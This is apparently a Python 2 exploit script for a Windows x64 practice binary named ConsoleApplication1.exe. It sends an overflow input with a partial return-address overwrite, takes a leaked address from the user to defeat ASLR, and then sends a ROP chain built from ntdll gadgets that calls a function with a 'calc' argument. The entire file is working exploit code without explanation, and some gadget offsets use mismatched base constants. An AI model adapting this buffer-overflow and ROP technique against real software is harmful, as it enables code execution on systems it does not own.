#-*- coding: utf-8 -*-
import os
import sys
import struct
import subprocess
from ctypes import *

kernel32 = windll.kernel32


ntdll = kernel32.LoadLibraryA('ntdll.dll')

print "0x%x" % (ntdll)


first_shellcode     =  'A'*12
first_shellcode     += 'B'*4
first_shellcode     += 'C'*8
first_shellcode     += '\x64\x10'

process = subprocess.Popen(["ConsoleApplication1.exe",str(first_shellcode)],stdin=subprocess.PIPE, stdout=sys.stdout)

pop_rcx_retn                    = struct.pack('<q',0x77B28FD0 - 0x77AD0000 + ntdll)
pop_r13_retn                    = struct.pack('<q',0x77B07917 - 0x77AD0000 + ntdll)
lea_rcx_rsp_plus_20_call_eax    = struct.pack('<q',0x76E04911 - 0x76DC0000 + ntdll)
pop_rax_retn                    = struct.pack('<q',0x76DDE166 - 0x76DC0000 + ntdll)
jmp_rax                         = struct.pack('<q',0x76E56FD1 - 0x76DC0000 + ntdll)
pop_rbx_retn                    = struct.pack('<q',0x76DCB830 - 0x76DC0000 + ntdll)
pop_rcx_retn                    = struct.pack('<q',0x76E19018 - 0x76DC0000 + ntdll)
push_rcx_retn_0                 = struct.pack('<q',0x76ECB194 - 0x76DC0000 + ntdll)

raw_input("[!] To continue the analysis, please accept messagebox and press ENTER")

leaked_function 		= raw_input("[!] Please write leaked function address (with 0x): ")

if "0x" not in leaked_function:
	leaked_function = "0x" + leaked_function

leaked_function 		= int(leaked_function,16)

program_base = leaked_function - 0x2AF8

leaked_function                 = struct.pack('<q',leaked_function)


mov_rdx_r13_call_rax            = struct.pack('<q',0x13FCC1CAB - 0x13FCC0000 + program_base)
calc_address                    = struct.pack('<q',0x13FCDF000 - 0x13FCC0000 + program_base)                                        

second_shellcode     =  'A'*24
second_shellcode    +=  pop_rcx_retn
second_shellcode    +=  calc_address
second_shellcode    +=  pop_rax_retn
second_shellcode    +=  leaked_function
second_shellcode    +=  jmp_rax

first_output = process.communicate(second_shellcode)
print first_output

